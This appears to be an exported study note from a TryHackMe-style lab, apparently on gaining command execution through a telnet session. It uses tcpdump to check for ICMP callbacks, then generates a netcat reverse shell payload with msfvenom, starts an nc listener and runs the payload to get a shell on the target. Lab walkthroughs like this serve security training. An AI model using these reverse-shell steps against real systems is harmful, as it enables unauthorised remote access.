<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>TCP dump</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>TCP dump</h1><br/><br />                                Start a tcpdump listener on your local machine.<br /><strong>If using your own machine with the OpenVPN connection, use:</strong><br /><br />• <code>sudo tcpdump ip proto \\icmp -i tun0</code><br /><br /><strong>If using the AttackBox, use:</strong><br />◇ <code>sudo tcpdump ip proto \\icmp -i ens5</code><br /><br />This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.<br /><br />                            <br />Now, use the command <strong>&quot;ping [local THM ip] -c 1&quot; </strong>through  the telnet session to see if we&#39;re able to execute system commands. Do  we receive any pings? Note, you need to preface this with .RUN (Y/N)<br /><br />Great! This means that we are able to  execute system commands AND that we are able to reach our local  machine. Now let&#39;s have some fun!<br /><br />We&#39;re going to generate a reverse  shell payload using msfvenom.This will generate and encode a netcat  reverse shell for us. Here&#39;s our syntax:<br /><br /><strong>&quot;msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R&quot;</strong><br /><strong><br /></strong><br />-p = payload<br />lhost = our local host IP address (this is <strong>your</strong>┬ámachine&#39;s IP address)<br />lport = the port to listen on (this is the port on <strong>your </strong>machine)<br />R = export the payload in raw format<br /><br /><br /><br />What word does the generated payload start with?<br /><br /><br />Perfect. We&#39;re nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:<br /><strong>&quot;nc -lvp [listening port]&quot; </strong><br />What would the command look like for the listening port we selected in our payload?<br /><br /><br />Great! Now that&#39;s running, we need to  copy and paste our msfvenom payload into the telnet session and run it  as a command. Hopefully- this will give us a shell on the target  machine!<br /><br /></div></body></html>